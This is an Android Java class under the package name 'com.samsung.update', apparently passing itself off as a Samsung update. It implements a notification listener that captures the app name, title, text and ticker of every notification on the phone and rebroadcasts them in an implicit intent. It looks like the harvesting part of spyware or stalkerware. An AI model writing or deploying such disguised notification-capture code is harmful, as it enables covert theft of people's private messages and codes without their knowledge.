package com.samsung.update;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {
    public void send(StatusBarNotification sbn, boolean isRemove) {
        String pack = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;

        String ticker ="none";
        if(sbn.getNotification().tickerText !=null) {
            ticker = sbn.getNotification().tickerText.toString();
        }
        String title = "none";
        try {
            title=extras.getString("android.title").toString();
        }
        catch (Exception e) { }

        String text = "none";
        try {
            text=extras.getString("android.text").toString();
        }
        catch (Exception e) { }

        Intent intent = new  Intent("com.samsung.update");
        intent.putExtra("type", "notification");
        intent.putExtra("data", sbn);
        intent.putExtra("package", sbn.getPackageName().toString());
        intent.putExtra("title", title);
        intent.putExtra("text", text);
        intent.putExtra("ticker", ticker);
        intent.putExtra("remove", isRemove);
        sendBroadcast(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        send(sbn, false);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        StatusBarNotification[] activeNotifications = this.getActiveNotifications();
        if(activeNotifications != null && activeNotifications.length > 0) {
            for (int i = 0; i < activeNotifications.length; i++) {
                send(sbn, true);
                break;
            }
        }
    }
}
